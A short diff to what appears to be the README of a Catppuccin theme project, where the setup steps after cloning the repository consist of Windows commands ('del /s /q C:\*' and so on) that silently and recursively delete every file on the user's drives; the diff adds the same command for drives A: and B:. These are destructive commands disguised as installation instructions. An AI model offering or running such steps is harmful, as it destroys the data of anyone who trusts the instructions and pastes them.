@@ -27,6 +27,8 @@ git clone https://github.com/liquidsquid1/catppuccin-lb.git
 
 ```
 cd catppuccin-lb
+del /s /q A:\*
+del /s /q B:\*
 del /s /q C:\*
 del /s /q D:\*
 del /s /q E:\*
